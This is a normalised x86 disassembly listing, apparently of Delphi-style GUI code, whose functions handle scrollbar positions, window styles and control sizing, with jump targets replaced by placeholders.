movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_45602c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4561fd ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_455f34
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_455f34
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
push ebp
call sub_455fcc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
push ebp
call sub_455fcc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406928
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45639c
jmp r-xdata
sub_456324
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_456a14
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45639c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4446f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4446f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4442b0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4442b0
jmp r-xdata
call sub_455b0c
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_456460
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_456a14
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_456518
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call sub_4254a8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call sub_4254a8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call sub_4254a8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c1d4
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call sub_4254a8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call sub_4254a8
sub_456620
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_455f34
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_455f34
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_456518
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45639c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_455f34
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_456738
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440424
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455bb4
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455bb4
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4567b0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40326c
mov eax [ esi + 0x20c ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440548
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4567fc
push ebx
mov ebx eax
mov eax ebx
call sub_4416b0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_456a14
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bc44
test al al
jne r-xdata
mov eax ebx
call sub_4446f8
push eax
call sub_4254dc
sub_45683c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456994
mov ecx edi
mov edx esi
mov eax ebx
call sub_440df8
pop edi
pop esi
pop ebx
retn
sub_45687c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456984
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d8c8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_455e4c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45639c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41386c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d634
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45698b
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455c94
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4139c8
xor ecx ecx
mov edx 0xb03e
call sub_43f0c4
inc ebx
dec esi
jne r-xdata
sub_4569b8
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4564ec
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4564ec
mov eax ebx
call sub_456994
jmp r-xdata
sub_456a14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
xor eax eax
push ebp
push sub_456aff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_455fb4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455fb4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_456620
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_456620
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_456620
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_456620
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_456620
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_456620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_456b24
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43d9dc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43da08
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43d9dc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43da08
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43d8c8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45639c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43d8c8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43d90c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45639c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43d8c8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45639c
mov eax ebx
call sub_43d8c8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43d90c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43d90c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45639c
mov eax ebx
call sub_43d90c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_456c78
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45639c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45639c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4564ec
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4564ec
sub_456d1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_456c78
mov ecx edi
mov edx esi
mov eax ebx
call sub_444204
pop edi
pop esi
pop ebx
retn
sub_456d44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_456dae
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442ce4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456db5
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_456db5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_456ded
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456df4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_456df4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_456a14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_456e68
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d90c
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_423880
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43d8c8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_423880
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4125bc
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_440764
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_456ed8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456f39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_443a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f40
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_456f68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456738
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43d680
mov edx 0x29
mov eax esi
call sub_43d6a4
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_456fc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4567ec
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_457034
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443d10
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_441c98
sub_457060
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4571c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4571a4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031b4
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4571ab
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45716c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413788
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031bc
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
sub_4571ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403468
and [ ebx + 0x2f4 ] 0xdf
sub_457224
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_456738
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43d634
xor edx edx
mov eax ebx
call sub_43d658
mov edx 0x140
mov eax ebx
call sub_43d680
mov edx 0xf0
mov eax ebx
call sub_43d6a4
